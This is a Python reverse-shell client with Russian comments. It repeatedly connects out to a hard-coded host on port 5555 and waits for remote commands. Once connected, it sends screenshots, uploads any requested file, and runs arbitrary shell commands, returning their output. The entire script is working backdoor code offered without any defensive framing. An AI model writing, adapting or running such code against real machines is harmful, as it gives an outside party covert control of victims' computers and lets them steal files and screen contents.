import socket
import os
import subprocess
import time
import sys

SERVER_HOST = "10.0.2.15"  # IP сервера
SERVER_PORT = 5555

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            return s
        except:
            time.sleep(5)

print(f"Подключаюсь к {SERVER_HOST}:{SERVER_PORT}...")
s = connect()
print("Подключено!")

# Отправляем приветствие
hostname = os.getenv('COMPUTERNAME', 'Unknown')
s.send(f"CONNECTED:{hostname}".encode())

while True:
    try:
        cmd = s.recv(4096).decode().strip()
        if not cmd:
            break
            
        if cmd == "EXIT":
            break
        elif cmd == "SCREEN":
            try:
                from PIL import ImageGrab
                from io import BytesIO
                img = ImageGrab.grab()
                img_bytes = BytesIO()
                img.save(img_bytes, format='PNG')
                data = img_bytes.getvalue()
                s.send(f"SCREEN:{len(data)}".encode())
                response = s.recv(1024).decode()
                if response == "OK":
                    s.sendall(data)
            except Exception as e:
                s.send(f"ERROR:{str(e)}".encode())
        elif cmd.startswith("GET "):
            filepath = cmd[4:]
            try:
                if os.path.exists(filepath):
                    size = os.path.getsize(filepath)
                    name = os.path.basename(filepath)
                    s.send(f"FILE:{name}:{size}".encode())
                    response = s.recv(1024).decode()
                    if response == "OK":
                        with open(filepath, "rb") as f:
                            s.sendall(f.read())
                else:
                    s.send(b"ERROR: File not found")
            except Exception as e:
                s.send(f"ERROR:{str(e)}".encode())
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            s.send(output.encode() if output else b"OK")
    except:
        break

s.close()
